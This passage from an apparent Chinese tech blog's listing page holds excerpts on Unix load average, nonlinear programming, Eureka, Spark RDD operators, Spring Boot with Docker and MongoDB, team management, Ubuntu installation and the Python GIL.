1.00 表示刚好是在这座桥的承受范围内。 这种情况不算糟糕，只是车流会有些堵，不过这种情况可能会造成交通越来越慢。
超过 1.00，那么说明这座桥已经超出负荷，交通严重的拥堵。 那么情况有多糟糕？ 例如 2.00 的情况说明车流已经超出了桥所能承受的一倍，那么将有多余过桥一倍的车辆正在焦急的等待。3.00 的话情况就更不妙了，说明这座桥基本上已经快承受不了，还有超出桥负载两倍多的车辆正在等待。
上面的情况和处理器的负载情况非常相似。一辆汽车的过桥时间就好比是处理器处理某线程 的实际时间。Unix 系统定义的进程运行时长为所有处理器内核的处理时间加上线程 在队列中等待的时间。
和收过桥费的管理员一样，你当然希望你的汽车（操作）不会被焦急的等待。所以，理想状态 下，都希望负载平均值小于 1.00 。当然不排除部分峰值会超过 1.00，但长此以往保持这 个状态，就说明会有问题，这时候你应该会很焦急。
假设当前服务器只有一个CPU，那么上面的"load average"就告诉我们在最近一分钟内，平均有0.14个进程在等待CPU；最近五分钟内，CPU有30%的idle时间；而最近15分钟，平均有3.06个进程在等待CPU。而当服务器有4个CPU的时候，则是另外一番景象。
“所以你说的理想负荷为 1.00 ？”
嗯，这种情况其实并不完全正确。负荷 1.00 说明系统已经没有剩余的资源了。在实际情况中 ，有经验的系统管理员都会将这条线划在 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a3a9f2e8249781ca00359b947218fce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e89bde415616832fdc289d2dd28286e/" rel="bookmark">
			到底什么是非线性规划？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文转自新浪博客《到底什么是非线性优化？》作者：那些年的那些偏执 网址：http://blog.sina.com.cn/s/blog_7445c2940102x3x4.html 作者系在读博士生。文章写的非常浅显易懂。本文除转载之外，做简单修改整理，重新编辑公式，并加入个人注释。
你是否也对非线性规划这个领域望而却步？​​​ 你是否也在思索非线性规划求解方法的根源？​​​ 你是否也苦恼于非线性规划到底在研究什么？ 如果你的回答是肯定的，说明我们是一样的。那么，让我们从这里开始，一起尝试去移走上面的三座大山。​
到底什么是非线性规划？​ 其实，在上高中的时候我们就已经对非线性规划的求解方法了然于心了。可见，非线性优化并不是我们想的那么困难，只不过在后来由于学习了大量的新知识，而迷失其中。你可能不相信，那么让我们一同回到高中的数学课上。数学老师给了如下的问题：​​ y=x2+2x+1 y = x 2 + 2 x + 1 的最小值是什么？
如何找到上面这个函数的最小值？相信你很快的就能想起上面这个问题的解法，并且求出上面这个函数的极值。而至此，我们已经解决了一个非线性规划的问题。​为什么这么说呢？请看下面的公式： minxf(x) min x f ( x ) 当这个公式中的 f(x) f ( x ) 是一个非线性函数的时候，上面的问题就是一个非线性规划的问题。​也就是说，非线性优化问题是针对一个非线性函数求最值的问题。那么，再让我们回过头看一看数学老师出的问题，这不就是一个非线性优化问题吗？​而且，求解方法也很简单，就是对函数求导，再令导数为零，我们就找到了极值点。可见，非线性优化并不是一个高不可攀的山峰。​
对于有约束条件的问题，如果约束条件是非线性的，那么这个问题也属于非线性规划问题范畴。
那么，我们是否可以对所有的非线性优化问题，都可以用上面的解法呢？很遗憾，对于很多情况，通过导数为零求解析的求出极值点，是做不到的。如下式：​​ f(x,y)=x3+y⋅ex+y2+xy+4 f ( x , y ) = x 3 + y ⋅ e x + y 2 + x y + 4 我们对 x,y x , y 分别求偏导，得到：​​ ∂∂xf(x,y)=3x2+y⋅ex+y∂∂yf(x,y)=2y+ex+x ∂ ∂ x f ( x , y ) = 3 x 2 + y ⋅ e x + y ∂ ∂ y f ( x , y ) = 2 y + e x + x 我们很难直接的从上面的式子中，求出导数为 0 0 的点。一方面，是因为该函数已经不是初等函数。另一方面，是因为增加了未知数（变量）的个数。为了解决这个难题，我们重新回到数学老师给的问题，如下：​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e89bde415616832fdc289d2dd28286e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3eeb70b66c4a4617b2c02ad1093f3e27/" rel="bookmark">
			注册中心 Eureka 源码解析 —— 应用实例注册发现 （二）之续租
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方“芋道源码”，选择“置顶公众号”
技术文章第一时间送达！
源码精品专栏
中文详细注释的开源项目
Java 并发源码合集
RocketMQ 源码合集
Sharding-JDBC 源码解析合集
Spring MVC 和 Security 源码合集
MyCAT 源码解析合集
本文主要基于 Eureka 1.8.X 版本
1. 概述
2. Eureka-Client 发起续租
2.1 初始化定时任务
2.2 HeartbeatThread
2.3 TimedSupervisorTask
3. Eureka-Server 接收续租
3.1 接收续租请求
3.2 续租应用实例信息
666. 彩蛋
1. 概述 本文主要分享 Eureka-Client 向 Eureka-Server 续租应用实例的过程。
FROM 《深度剖析服务发现组件Netflix Eureka》 二次编辑 蓝框部分，为本文重点。
非蓝框部分，Eureka-Server 集群间复制注册的应用实例信息，不在本文内容范畴。
推荐 Spring Cloud 书籍：
请支持正版。下载盗版，等于主动编写低级 BUG 。
程序猿DD —— 《Spring Cloud微服务实战》
周立 —— 《Spring Cloud与Docker微服务架构实战》
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3eeb70b66c4a4617b2c02ad1093f3e27/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74c97ca99ea7a5df11ced3959ca8b5df/" rel="bookmark">
			RDD中的一些常用的算子操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 算子分类 RDD的算子分类可以分为2种，Transformation和Action类 。
Transformation：根据数据集创建一个新的数据集，计算后返回一个新RDD；例如：Map将数据的每个元素经过某个函数计算后，返回一个新的分布式数据集。
Action：对数据集计算后返回一个数值value给驱动程序；例如：collect将数据集的所有元素收集完成返回给程序。
2 Transformation的特点 RDD中的所有转换都是延迟加载的，也就是说，它们并不会直接计算结果。相反的，它们只是记住这些应用到基础数据集（例如一个文件）上的转换动作。只有当发生一个要求返回结果给Driver的动作时，这些转换才会真正运行，即，遇到action才进行计算，否则不计算。这种设计让Spark更加有效率地运行。
这里大家可以思考一个问题，为什么采用这种方式就可以更高效呢？
（ persist (or cache) method 会在后面进行讲解）
3 进一步了解Transformation和Action 下面举一个例子更好的了解Transformation和Action，以及lazy的含义：
首先进行一个Transformation操作产生一个RDD 查看UI界面 scala&gt; val a=sc.parallelize(1 to 9) a: org.apache.spark.rdd.RDD[Int] = ParallelCollectionRDD[0] at parallelize at &lt;console&gt;:24 再进行一次map又会产生一个新的RDD ，这时候再次查看UI界面把并没有变化 scala&gt; val b=a.map(x =&gt;x*2) b: org.apache.spark.rdd.RDD[Int] = MapPartitionsRDD[1] at map at &lt;console&gt;:26 进行一个action操作 查看UI看看有什么变化呢？ scala&gt; b.collect Array[Int] = Array(2, 4, 6, 8, 10, 12, 14, 16, 18) 4常用的算子操作 map 、filter、 collect算子
有一定基础的情况下建议大家使用链式编程 scala&gt; val a = sc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74c97ca99ea7a5df11ced3959ca8b5df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2042819802aebff664590de1b98d8620/" rel="bookmark">
			判断两个区间相交
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		判断两个区间相交 /** * 判断两个区间相交 正向思维 * 四种情况： * 1.区间A[1,5] 区间B[4,8] * 2.区间A[5,9] 区间B[4,8] * 3.区间A[1,9] 区间B[4,8] * 4.区间A[5,7] 区间B[4,8] * */ public void positiveThinking(int a1, int a2, int b1, int b2) { if(a1 &lt; a2 &amp;&amp; b1 &lt; b2) { if((a1 &lt; b1 &amp;&amp; a2 &gt; b1 &amp;&amp; a2 &lt; b2) || (a1 &gt; b1 &amp;&amp; a1 &lt; b2 &amp;&amp; a2 &gt; b2) || (a1 &lt; b1 &amp;&amp; a2 &gt; b2) || (a1 &gt; b1 &amp;&amp; a1 &lt; b2 &amp;&amp; a2 &lt; b2) || a1 == b1 || a2 == b1 || a1 == b1 || a2 == b2) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2042819802aebff664590de1b98d8620/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae2b7b77d9c74bf63efa71a133da9774/" rel="bookmark">
			腾讯云安装Docker，并部署Springboot
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 ​最近想在微信公众号中做个小程序出来，供大家日常生活中使用。本来打算直接调阿里api市场中提供的接口的，可是发现其中的接口都是http的，而微信小程序中要求接口必须是https的，因此只能申请个腾讯云，自己搭个后台转一下了。在探索过程中发现以下几个比较有用的文章：
1 阿里API市场 做小程序离不开数据接口，暂时先选用阿里的api市场，里面也有好多免费的api接口，只不过都是http的： 阿里API市场​2 如何申请、购买腾讯云 这个腾讯云流程写得很清楚了，学生一般会有很大优惠，如果你现在还是学生的话，建议先申请个腾讯云，巨便宜。3 在腾讯云上安装docker docker的出现让部署java程序简化了很多，具体作用就不再多讲，总结为一句话：集装箱市部署，彼此隔离独立。 在腾讯云服务器上部署docker其实异常简单，只需按照docker的官方文档照做即可，虽然文档是英文的，只要按照其中的流程挨个敲命令执行就行，尤其对于新手小白来说，千万不要想得太复杂。 docker部署官方文档4 docker环境下部署springboot程序 Springboot是目前比较流行的微服务框架，其生成的jar包在docker环境下的部署方法如下，简单明了： docker部署springboot项目 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bed029541b2fed3f6d9d57aacf5de1fc/" rel="bookmark">
			【解决】小程序|微信公众号授权给第三方平台时报“没有绑定公众号”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果第三方平台没有全网发布时，要在授权账号公众号列表里面填写的原始ID。如果是测试小程序，也要加上小程序的原始ID。
实操验证的经验。
完整小程序第三方授权操作流程：1、第三方平台需要设置小程序权限集，服务器配置，并提交，不必全网发布；2、若上步未全网发布，需将要授权的小程序的原始ID配置到第三方平台的测试公众号列表中；3、在第三方发起的小程序授权登录页，要授权的小程序，需要其管理员来扫码，此时管理员微信界面上会有服务号、小程序两栏账号列表（当授权登录页的auth_type参数未设置时），选中授权即可。​4、小程序授权第三方，与小程序是否认证、什么账号类型、是否关联了服务号、是否绑定了开发者账号没有关系。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f394741621c40800dc8ef9519fdeaf5/" rel="bookmark">
			第五十二章：基于SpringBoot2使用Rest访问MongoDB数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在之前项目中我们想要读取MongoDB内的内容需要使用MongoDBTemplate来完成数据的CRUD，那如果我们想要通过RestController的形式获取MongoDB内的数据就更麻烦了，还需要自行去创建对应的控制器，然后使用MongoDBTemplate从MongoDB内读取出数据后返回给前端。
在上一章节第五十一章：基于SpringBoot2 &amp; MongoDB完成自动化集成我们讲到了SpringBoot2与MongoDB集成后怎么简单的操作数据，当然Spring Data Xxx家族方式的设计与Spring Data JPA一样，Sring Data MongoDB提供了一个MongoRepository&lt;T,PK&gt;接口来为继承该接口的子接口自动提供代理类完成数据操作实现。
本章目标 使用Spring Data Rest自动映射读取MongoDB内的数据，省去一系列繁琐的操作步骤。
为你推荐 第五十一章：基于SpringBoot2 &amp; MongoDB完成自动化集成第五十章：SpringBoot2.0新特性 - 岂止至今最简单redis缓存集成第四十九章：SpringBoot2.0新特性 - 你get到WebMvcConfigurer两种配置方式了吗？第四十八章：SpringBoot2.0新特性 - RabbitMQ信任package设置第四十七章：SpringBoot2.0新特性 - Quartz自动化配置集成 SpringBoot 企业级核心技术学习专题 专题专题名称专题描述001Spring Boot 核心技术讲解SpringBoot一些企业级层面的核心组件002Spring Boot 核心技术章节源码Spring Boot 核心技术简书每一篇文章码云对应源码003Spring Cloud 核心技术对Spring Cloud核心技术全面讲解004Spring Cloud 核心技术章节源码Spring Cloud 核心技术简书每一篇文章对应源码005QueryDSL 核心技术全面讲解QueryDSL核心技术以及基于SpringBoot整合SpringDataJPA006SpringDataJPA 核心技术全面讲解SpringDataJPA核心技术007SpringBoot核心技术学习目录SpringBoot系统的学习目录，敬请关注点赞！！! 构建项目 使用Idea开发工具创建一个SpringBoot的项目，添加相应的依赖，pom.xml配置文件依赖内容如下所示：
&lt;dependencies&gt; &lt;!--mongodb依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-mongodb&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--data rest依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-rest&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!--Lombok依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 我们本章节的依赖比上一章多了一个spring-boot-starter-data-rest，通过这个依赖我们可以自动完成RestController的依赖配置，不需要再手动去创建控制器，因为我们通过一些简单的注解配置以及固定格式名称规则的方法就可以完成控制器的实现。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f394741621c40800dc8ef9519fdeaf5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7496922ef911fee5de2c0851b4ed27c5/" rel="bookmark">
			项目团队转型成产品团队的点点滴滴
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 转眼间我的博客已经有将近一年半的时间没有进行更新了，从今以后要重新对博客进行维护了，新时期开始的第一篇文章，来说一说工作上的一些感悟。
刚刚参加工作的时候，进的是一个项目型的团队，主要是通过外包项目来盈利，幸运的是，应公司发展战略的要求，我们的项目团队奉命向产品研发转型，因此我才有了这篇博客中的感悟，本人工作经验不足，说的不合适的地方请大家多多包涵。 首先，一句话总结，项目是客户的，产品是自己的。 如上图，我觉得在项目团队转型成产品团队的过程中，涉及到的转变主要由以上图中所列的五项内容： 1. 客户和用户的转变 2. 团队本身的名气 3. 产品线的长线发展和运营 4. 项目管理和产品管理上的冲突 5. 风险责任的承担 接下来，我们就逐个来谈谈我自己的感想。
1、客户和用户的转变 项目型团队 项目型团队的主要任务是做项目，主要收益是来自项目的一次性佣金和之后的维护费，这些费用都是谁来付呢？都是客户来付，因此，项目收益的第一目标人群是客户，由客户再去面向用户，项目团队不会直接接触用户群体，用户的意愿也是经由客户来进行转达。接下来我们用一个简单图示来表述对于项目类型的团队，团队本身、客户群体、用户群体三者之间的相互关系： 结合上图，可以简单总结出如下几点：
1 项目团队永远都面向的是客户群体，无论是项目交付、项目运维、获取合同回款、获取维护费用，都是和客户群体在打交道2 客户负责和用户群体进行沟通，客户将拿到的项目向用户进行推广，促进用户使用，以便达成一定的目标；同时负责将用户的对项目的意愿转换成需求，再反馈给项目团队，同时支付项目的维护费用 综合以上两个观点，登出一个通俗易懂的结论：对应项目型团队来讲，客户直接给我们钱，用户间接给我们名气。
产品型团队 与项目型相对应，产品型团队的交流环节中，没有“客户”这个环节，产品一经发布，直接面向客户进行推广，直接接受用户的体验反馈，在产品的运营、推广期间，产生收益，该收益可能是用户直接支付（如开通VIP会员、购买虚拟道具等），也可能是通过用户流量产生的间接收益（如平台广告费等）。
总结 针对项目型团队和产品型团队，我们简单总结其与用户、客户间的依赖关系
项目型团队：团队面向客户，客户支付一次性佣金，同时对客户提供长期或短期的技术支持，并收取维护费用，收益明码标价，只要能够如期验收，稳赚不赔；产品型团队：团队直接面向用户，对产品平台提供近似于无限期的技术支持和主动优化任务，产品平台的用户体验直接影响团队收益，具体收益不固定，可能很多也可能很少，需要相对专业的运维和推广。 2、团队本身名气 出名要趁早，团队的名气直接决定个人的名气，个人的名气直接决定薪水（或者说是跳槽后的薪水）。 项目型团队和产品型团队，在名气方面有两个相同点：一是两种团队（或者说是所有团队）都有提高团队名气的迫切愿望；二是两种团队的名气最终的主要来源都是用户，而非客户。
项目型团队 接下来，我们用一个简单的图来解释一下项目类型团队自身名气的来源： 还是那句话，项目型团队直接面向的客户，而非用户；而从数量上来讲，用户群体的数量肯定是远远大于客户群体的数量的。名气的产生和传导相对于项目的交付是相反的过程，宣传对象也是逐级反向的，这个项目上线之后，用户使用过程中觉得好，用户称赞的是客户；客户受到用户的表扬之后，才可能继续称赞项目团队本身，给我们名气。 举个简单的例子，一个项目团队给一个学校做了一个教务管理系统，假设这个学校有一万名学生，教务处工作人员有100人，这里这一万名学生就是用户群体，100名教务处工作人员就是客户群体。那么这个教务系统主要是谁用呢？是学生用，假设这个教务系统做的很好，用起来很方便，那么这一万名学生的用户群体会夸谁呢？会给谁点赞呢？肯定是客户，他们会说“咱学校的教务系统做的真好，用起来真方便”，口耳相传，名气就产生了，只不过这个名气针对的主题是客户群体（学校教务处），而非项目团队本身。等学校教务处工作者收到广大学生的反馈，都反馈这个系统好用，那么今后在和其他学校进行沟通时，可能会说“某某公司、某某团队做的教务系统挺好用，学生们都说好”，这里也会在客户圈子中产生一种名气，这中名气针对的是项目团队本身。 针对以上这个小例子，两种名气，谁产生的，宣传的是谁，影响力、传播力方面孰轻孰重，显而易见。
产品型团队 产品型团队，直接面对用户，在名气的产生、传导过程中，没有“客户”这个中间截流环节，广大用户群体的反馈信息直接反应到产品团队本身，并直接影响产品的经济收益。产品做得好，用户直接夸具体的团队、具体的开发公司，夸得人多了，用户量就能上去，用户量上去了，用户活跃度上去了，钱自然就来了。相反的，如果产品做得不好，用户骂也是直接骂团队、骂公司，骂得人多了，产品也就凉了，收益自然也就无从谈起。
总结 在名气方面，两者区别如下：
项目型团队：由于中间有客户群体的截流，东西做得好，团队不会受到过多的宣传表扬，做的不太好，也不会直接背负过多负面问题，这在一定程度上会催生团队本身的惰性，名气和团队收益也不是强作用关系。产品型团队：由于没有中间客户的截流，产品型团队更容易获得名气，当然如果做的不好，也更容易收获骂名，名气和团队收益直接挂钩。 3、产品线的长线发展和运营 东西多了就需要成体系，这个是放之四海而皆准的道理，团队运营也不例外。然而，产品型团队和项目性团队在成体系运营的方面还是有本质差距的。 产品型团队：产品型团队的产出是产品，产品不一定只是一个，也可能是一套，这一套东西就能构成一个体系，营造一个生态。就好比一棵大树和上面的树枝一样。支线版本虽多，但归根结底大家都是一个产品生态中的，就比如当下最火的腾讯系和阿里系。腾讯系主要主要依托QQ、微信代表的社交群体主干，在这个主干基础上来构建诸如腾讯视频、腾讯游戏等等一些列周边产品；同样的阿里则是依托支付宝、淘宝等消费群体主干，构建诸如钉钉、云服务等生态服务环境。总之一句话，无论产品做得多大，多么丰富，万变不离其宗，根儿还是那一个。项目型团队：项目型团队的产出是一个个的项目，而项目是完全按照客户的意愿去做的，因此项目型团队中做得各个项目往往是呈现一种齐头并进的局面，东西大而全。如果想将各个项目做成体系，最大的问题在于如何说服客户，说直白点，你做不做成体系，跟用户没有半毛钱关系，我花一分钱，买一个项目，至于其他项目怎么布局，怎么规划，我并不关心。因此，项目型团队的项目，彼此之前可能会有联系，但很难有层次感，形成递进的那种关系，没有层次感，没有侧重点，彼此之前数据也不能互通，因此谈不上生态。 在这里多说几句，从对成果的细化、调优、长久运营来讲，项目型团队很大程度上不敌产品型团队，这里并不是说两者技术能力有多大差别，而是说两个的时间投入不同。项目型团队的时间精力更多的被分摊到各个平行的项目上，手心手背都是肉，很难将精力集中在某一个或者某几个项目上；产品型团队则不同，产品型团队的成果是有体系的、有主次的、有生态的，因此可以集中精力解决主要问题，就好比腾讯肯定要先保证QQ、微信的强大，阿里要保证支付宝的强大一样，好钢用在刀刃上，才能更锋利。 4、项目管理和产品管理上的冲突 任何团队都需要管理。项目团队需要的是项目类型的管理，产品团队需要的是产品类型的管理。 项目型团队：项目自身发生变更、优化、升级的正常来源只有一个：客户需求。在正常情况下（排除重大BUG、重大漏洞的情况），只有客户触发了需求变更，有时甚至需要相应的合同支持，项目团队才会开始对项目进行变更、修改、升级，因为毕竟当初出钱来买断项目的是客户，这种管理模式无可厚非。产品型团队： 产品型团队对产品自身的更新优化是主动的，来源是多样的。市场需求的变化、产品自身发展规划的调整、产品盈利诉求的变化，都会导致产品平台的升级更新，更新是主动的，也是利益驱使的，毕竟产品的主动权在我们手中，我们自己评估该怎么改，那就怎么改，完全是团队自主决定，无需再说服他人，说服客户。 一句话，谁出钱听谁的。客户出钱我们就以客户的意志为主导；用户出钱我们就以市场的驱使和自己的判断为主导。
5、风险的承担 产品型团队和项目型团队因为所直面的群体不一样，所有风险的承担也各有轻重。 很简单，谁直接面向用户，谁直接承担风险。项目型团队将项目交付给客户，客户将项目推广给用户，客户直接面向用户，那产生的风险首先会直接压在客户方面，然后客户再将相关的问题压力传导到项目团队，限期更新升级。对应的产品型团队将产品直接推广给用户，团队直接面向用户，那产生的风险也会直接压在产品研发团队身上，这也是小的产品团队创业不容易成功的原因，底子薄，一失足成千古恨。 举个简单例子，学校的教务系统就是一个典型项目，教务系统瘫痪了，广大学生抱怨的是学校，很少会直接抱怨开发教务系统的那个项目团队；淘宝是个典型的产品平台，如果淘宝首页404了，那老百姓肯定直接投诉到阿里了。
6、如何说服领导层从项目团队向产品团队转型 说了这么多，无非是从多个方面将项目型团队和产品型团队做了对比，在这里我想说，如果条件允许（公司实力、人员规模、收益来源稳定性等），还是应该向产品型团队进行转型。项目型的运作方式虽然可以说正常情况下只赚不赔，也不用过多的操心如何推广、如何盈利，相对产品创业团队要安逸许多，但产品型团队在效率、成就感、产品精致程度、盈利前景、名气、规划自由度等方面还是很有优势。假如你身处一个项目型的团队，你想说服领导代领团队向产品型进行转型，可以从以下几点入手：
1 归一化，维护成本降低。将项目转型成产品，最最最初级的做法就是将相似项目抽象出一个产品主线来，即主版本，有了主版本，有了归一化的项目主干，各个项目各主版本都保持少量的特色差异，这对于已有项目的维护成本、新项目的开发成本，都会有很大程度上的降低，节省工期，节省工作量。
2 盈利前景扩大化：做项目赚的的是合同钱，是死工资；做产品是自己做老板，多劳多得；要想转型做产品，起码得有个自信，相信自己能够运维得比客户更好， 推广得更厉害，技术上就更不用说了，要坚信转型成产品团队，我们的产品所带来的收益要远远比现有项目的固定收益好。
3 自己做产品能拿到数据：做项目的话，99.99%的数据是客户的；自己做的产品，100%的数据都是自己掌控的，然而，数据是无价的。
4 名气：名利名利，名气和利益是相辅相成的，名气大了才能多挣钱。自己做的产品要是真的好，想出名都是很快的事儿，典型的诸如“饿了么”这个例子。做项目能出名吗？也能，但要看客户愿不愿意给你宣传了。
7、团队的转型和已有工程项目的转型 项目型的团队能够转型成产品型的团队吗？没问题，但需要一个有话语权的产品经理来牵头。 已经卖出去的项目能变成产品吗？不可能，因为没数据，没copyright；顶多是参照产品的运营模式来运营已有项目，做归一化，抽主版本。 如果觉得这篇文章对您有所启发，欢迎关注我的公众号，我会尽可能积极和大家交流，谢谢。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9c28245b70e71e936f9bb200878c571/" rel="bookmark">
			jquery 时间戳转日期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 /** * 时间戳转日期 * @param timestamp * @returns {*} */ function timestampToTime(timestamp) { var date = new Date(timestamp * 1000);//时间戳为10位需*1000，时间戳为13位的话不需乘1000 Y = date.getFullYear() + '-'; M = (date.getMonth()+1 &lt; 10 ? '0'+(date.getMonth()+1) : date.getMonth()+1) + '-'; D = date.getDate() + ' '; h = date.getHours() + ':'; m = (date.getMinutes() &lt; 10 ? '0'+(date.getMinutes()) : date.getMinutes()) + ':'; s = (date.getSeconds() &lt; 10 ? '0'+(date.getSeconds()) : date.getSeconds()); return Y+M+D+h+m+s; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b7043bfdd3badaa6fc52c4cb092af48/" rel="bookmark">
			卸载win10装Ubuntu笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前装的win10系统经常动不动磁盘100%，经常卡机，所以打算卸载掉，然后装上Ubuntu系统。
（一）制作一个启动盘
(二)进入bios，将boot secure关闭
(三)通过Ubuntu启动，可以看到一个选择界面，第一项为try ubuntu without install，第二项为install ubuntu，我们先通过按键盘上的e进入如下界面： 将第二行splash —后面的’—’改为nomodeset，即变为splash nomodeset。如果不修改，可能会卡在进入Ubuntu的界面中不能往下进行。改完之后，按F10就可以进入安装。
(四)安装过程一路默认，不要联网，知道分区，如下图所示： 点击其他选项，进入自定义分区。
(五) 把除了swap盘以外的所有盘都删掉（其实swap盘也可以删掉，到时候再分配大小就好了）。 最后如图所示： 在这个空闲盘中建3个盘。 1.一个EFI盘，主分区，用于引导系统启动，2G就足矣。 2.一个根目录(/)，主分区，ET4文件系统，一般120G就可以。 3.一个home目录，逻辑分区，剩余都给它。
然后安装启动引导器的设备选择根目录对应的磁盘。
（六）等待进度条安装即可。
遇到的问题： 1.在点击install ubuntu时，一直卡在Ubuntu一点一点的图标那里，因为没有修改splash。即上面第(三)步提及的。
2.分区之后，一直提示“第一分区设备的一个vfat挂载到/boot/efi失败”，因为这个/boot/efi可能是之前win10残留的，需要先删除掉，然后重新分配。
3.安装成功后，拔掉U盘重启，显示“reboot and select proper boot device”，没有分配EFI盘用来引导启动。
4.开机的时候出现了acpi错误，ACPI Error: Namespace lookup failure，解决方法是，在开机选择ubuntu的时候，点击E，进入配置界面，将splash 后面的值删掉，改为acpi=off，即变为splash acpi=off
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f332026221f534a1ec2086e74c7d9fe/" rel="bookmark">
			Python原理知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python原理知识 Python比C、 C++执行效率低是多种原因交织在一起的原因。
我觉得关键问题是 动态类型、解释执行、虚拟机、GIL这四个方面的问题：
1、为了支持动态类型，Python对象加入了很多抽象，执行的时候要不断的判断数据类型，带来很大的开销，动态类型的动态检查开销，降低了运行速度
2、python代码由解释器逐条解释执行（interactive model）或每次执行都要先翻译再运行，运行效率大大降低。静态编译的程序在执行前全部被翻译为机器码，而解释执行的则是一句一句边运行边翻译。
3、虚拟机带来间接开销，而且Python的虚拟机cpython性也不如jvm。
4、GIL全局锁带来的伪多线程问题，所以python大力发展协程和异步语法
C++是直接编译成可执行二进制代码，有系统原生的进程、线程加持，没有动态类型的开销，没有虚拟机的开销，如果没有使用虚函数、虚继承等特性，C++代码能获得C语言一样的效率。
同样运行在虚拟机上的java，编译成字节码再执行，效率就高多了，重IO的场景与C++相比也不遑多让。
Python的另一个解释器PyPy引入了JIT、多线程等，执行效率蹭蹭的就上去了。
cpython 也就是cpython解释器太垃圾了？python官方为什么不用pypy呢
因为pypy还是很有局限性的，对于c写的库支持问题比较大。不适合所有场景。pypy牺牲了C接口兼容性
JIT JIT编译器，英文写作Just-In-Time Compiler，中文意思是即时编译器。
JIT是一种提高程序运行效率的方法。通常，程序有两种运行方式：静态编译与动态解释。静态编译的程序在执行前全部被翻译为机器码，而解释执行的则是一句一句边运行边翻译。
Python的GIL是什么鬼，多线程性能究竟如何 前言：博主在刚接触Python的时候时常听到GIL这个词，并且发现这个词经常和Python无法高效的实现多线程划上等号。本着不光要知其然，还要知其所以然的研究态度，博主搜集了各方面的资料，花了一周内几个小时的闲暇时间深入理解了下GIL，并归纳成此文，也希望读者能通过次本文更好且客观的理解GIL。
文章欢迎转载，但转载时请保留本段文字，并置于文章的顶部 作者：卢钧轶(cenalulu) 本文原文地址：http://cenalulu.github.io/python/gil-in-python/
GIL是什么 首先需要明确的一点是GIL并不是Python的特性，它是在实现Python解析器(CPython)时所引入的一个概念。就好比C++是一套语言（语法）标准，但是可以用不同的编译器来编译成可执行代码。有名的编译器例如GCC，INTEL C++，Visual C++等。Python也一样，同样一段代码可以通过CPython，PyPy，Psyco等不同的Python执行环境来执行。像其中的JPython就没有GIL。然而因为CPython是大部分环境下默认的Python执行环境。所以在很多人的概念里CPython就是Python，也就想当然的把GIL归结为Python语言的缺陷。所以这里要先明确一点：GIL并不是Python的特性，Python完全可以不依赖于GIL
那么CPython实现中的GIL又是什么呢？GIL全称Global Interpreter Lock为了避免误导，我们还是来看一下官方给出的解释：
In CPython, the global interpreter lock, or GIL, is a mutex that prevents multiple native threads from executing Python bytecodes at once. This lock is necessary mainly because CPython’s memory management is not thread-safe. (However, since the GIL exists, other features have grown to depend on the guarantees that it enforces.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f332026221f534a1ec2086e74c7d9fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b2db68478f423ca2cae8533c412d289/" rel="bookmark">
			使用css修改input框中checkbox的样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
